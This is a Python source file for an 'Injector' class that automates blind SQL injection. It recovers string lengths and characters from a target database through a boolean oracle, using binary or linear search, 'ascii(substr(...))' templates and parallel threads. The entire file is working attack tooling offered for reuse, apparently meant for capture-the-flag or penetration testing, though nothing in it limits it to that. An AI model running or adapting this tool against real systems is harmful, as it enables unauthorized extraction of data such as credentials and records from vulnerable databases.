from typing import Callable, Literal
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

INT_MAX = 2147483647

class Injector:
    @dataclass
    class Templates:
        inject_template: 'str | Callable[..., str]'
        search_template: 'str | Callable[..., str]' = "(({target}) < {value})"
        length_template: 'str | Callable[..., str]' = "LENGTH( ({}) )"
        get_ith_template: 'str | Callable[..., str] | None' = "ascii(substr(({target}), {value}, 1))"
        check_ith_template: 'str | Callable[..., str] | None' = None

    def use_template(self, template, *args, **kwargs) -> str:
        if callable(template): return template(*args, **kwargs)
        return template.format(*args, **kwargs)

    def __init__(self, templates: Templates, checker: 'Callable[[str], bool]', int_max = INT_MAX, max_threads = 8, mode: "Literal['binary', 'linear']" = 'binary'):
        self.templates = templates
        self.checker = checker
        self.int_max = int_max
        self.max_threads = max_threads
        self.mode = mode
        if self.mode == 'linear':
            self.searcher = self.linear_search
        elif self.mode == 'binary':
            self.searcher = self.binary_search
        else:
            raise ValueError(f'Unknown mode: {mode}')
    
    def check(self, target: str) -> bool:
        return self.checker(self.use_template(self.templates.inject_template, target))

    def binary_search(self, search_target: str, lower: int, upper: int) -> int:
        mid = 0
        while lower < upper:
            mid = (lower + upper + 1) // 2
            search = self.use_template(self.templates.search_template, target=search_target, value=mid)
            if self.check(search):
                upper = mid - 1
            else:
                lower = mid
        return lower
    
    def linear_search(self, search_target: str, lower: int, upper: int) -> int:
        i = lower
        while i <= upper:
            search = self.use_template(self.templates.search_template, target=search_target, value=i)
            if self.check(search):
                return i
            i += 1
        raise ValueError(f"Search {search_target} not found between [{lower}, {upper}]")
    
    def char_search(self, target: str, pos: int):
        lower = 1
        upper = 255
        i = lower
        while i <= upper:
            search = self.use_template(self.templates.check_ith_template, target=target, position=pos, value=i)
            if self.check(search):
                return i
            i += 1
        raise ValueError(f"Search {target}@{pos} not found between [{lower}, {upper}]")

    def get_length(self, target: str) -> int:
        length = self.searcher(self.use_template(self.templates.length_template, target), 0, self.int_max)
        if length == self.int_max:
            raise ValueError(f"Length reaches upper bound {self.int_max}, which is probably an error in sql code. ")
        return length

    def get_str(self, target) -> str:
        length = self.get_length(target)
        print(f"Length: {length}")
        res = bytearray([ord('?')] * length)
        # for i in tqdm(range(length)):
        #     i_target = f"ascii(substr(({target}),{i+1},1))"
        #     c = self.binary_search(i_target, 0, 255)
        #     res.append(c)
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            if self.templates.check_ith_template is not None:
                futures = { executor.submit(self.char_search, 
                                        target, i+1)
                        : i for i in range(length) }
            elif self.templates.get_ith_template:
                futures = { executor.submit(self.searcher, 
                                        self.use_template(self.templates.get_ith_template, target=target, value=i+1), 
                                        0, 255)
                        : i for i in range(length) }
            else:
                raise ValueError("At least one of check_ith_template, get_ith_template should be provided")
            for future in (bar := tqdm(as_completed(futures))):
                c = future.result()
                res[futures[future]] = c
                bar.set_description(f'Progress: {res.decode(errors="ignore")}')
        return res.decode(errors='ignore')

    def get_int(self, target: str, int_max: int | None = None):
        if int_max is None: int_max = self.int_max

        return self.searcher(target, -int_max, int_max)